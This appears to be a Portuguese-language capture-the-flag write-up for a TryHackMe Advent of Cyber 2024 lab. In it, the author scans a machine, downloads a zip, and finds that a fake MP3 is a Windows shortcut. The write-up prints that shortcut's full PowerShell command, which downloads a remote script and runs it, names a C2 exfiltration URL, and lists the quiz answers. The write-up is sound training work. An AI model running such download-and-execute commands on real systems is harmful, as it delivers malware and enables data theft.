# Advent-of-Cyber-2024-THM
![image](https://github.com/user-attachments/assets/04709f1d-900f-4a3e-9952-d24ccf24caf3)

Tarefa 7

Segurança operaciona

Dia 1: Talvez a música do SOC-mas, ele pensou, não venha de uma loja?

PASSO A PASSO PARA A RESOLUÇÃO DAS QUESTÕES:

Executei o Nmap para escanear as portas que estavam abertas, o resultado mostrou 3 portas:
Porta 22 (SSH)
Porta 80 (HTTP)
Porta 8000 (HTTP-alt)



![image](https://github.com/user-attachments/assets/c7d43844-fdc9-454a-b562-953a2924df0f)


Em seguida enumerei os diretórios do webserver com o Gobuster, o que me mostrou o diretório /download estando disponivel



![image](https://github.com/user-attachments/assets/947a076f-b968-4f0e-a30b-a28302a3e680)



Acesse o diretório como http://IP_DA_MAQUINA/download, assim ele já faz download do arquivo zip denominado download.zip.


![image](https://github.com/user-attachments/assets/994d2165-81f4-4ee3-825c-79bc170fdae2)


Descompacte o arquivo zip, e lá conterá dois arquivos .mp3, sendo eles song.mp3 e somg.mp3

Utilizando o comando file song.mp3 eu identifiquei o arquivo como sendo um áudio em formato MPEG ADTS se trata realmente de um arquivo de musica, não tem nada de suspeito nele.
![image](https://github.com/user-attachments/assets/1d3396c9-3635-49b9-bcf2-8a1d47a8f7f8)


Mas temos um arquivo disfarçado sendo o segundo arquivo chamado de somg.mp3, a primeira vista também pode parecer suspeito por ter um erro de ortografia. mas iremos analisar a fundo esse arquivo.
Utilizei o comando file somg.mp3 identifiquei como um atalho LNK ao inves de um arquivo de audio, que apontava para o powershell.exe. iremos nos apronfundar muito mais.
![image](https://github.com/user-attachments/assets/4b9fb32d-e983-4834-9a9b-7282d912d88b)


Usei exiftool somg.mp3, para obter informações mais detalhadas sobre o atalho, e o arquivo apontava para um comando PowerShell, que baixava e executava um script localizado no GitHub, sendo o comando:
powershell.exe -ep bypass -nop -c (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1')


![image](https://github.com/user-attachments/assets/fdf7380b-cde3-42af-8c72-8a3699b23b60)











RESPONDENDO A 1ª PERGUNTA
![image](https://github.com/user-attachments/assets/45ce33f5-bab7-4c73-b64f-6bede4101ee0)
Eu também usei o exiftool no arquivo song.mp3, confirmando que ele era realmente um arquivo MP3 e obtendo a informação da 1ª pergunta da TAREFA 7, sendo o Artista: Tyler Ramsbey
![image](https://github.com/user-attachments/assets/9eb60ee0-4281-454e-90bd-57aed094c6fa)







RESPODENDO A 2ª PERGUNTA
![image](https://github.com/user-attachments/assets/84059020-f16f-4cc7-9b70-8812c1ed0da0)
Você executou o comando exiftool somg.mp3, copie o link, e cole no navegador, e analise o conteúdo, e que responde nossa pergunta está na função Send-InfoToC2Server que envia as informações roubadas para um servidor C2 (Command and Control) usando um comando Invoke-WebRequest. O servidor C2 especificado está localizado na URL http://papash3ll.thm/data.
![image](https://github.com/user-attachments/assets/e8316db0-ac58-46a6-a9ad-d1b66e6df77c)
![image](https://github.com/user-attachments/assets/29092bbb-e21b-436d-a9fe-cb63d0b974d1)









RESPONDENDO A 3ª PERGUNTA
![image](https://github.com/user-attachments/assets/835e0920-5b9c-4cdd-8428-0b45d7d59e8b)
Fácil, Fácil. 
https://github.com/MM-WarevilleTHM/M.M









RESPONDENDO A 4ª PERGUNTA
![image](https://github.com/user-attachments/assets/801d6509-2a73-4f99-be85-e1e059fe6fd4)
https://github.com/Bloatware-WarevilleTHM/CryptoWallet-Search/commit/e2a7aea21f07f52ebdc7d9c1edfa7ac546f7406d
![image](https://github.com/user-attachments/assets/e1337464-cacd-4403-8ac9-a0f31e70b02f)



----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Tarefa 8

Análise de log

Dia 2: O falso positivo de um homem é a miscelânea de outro.


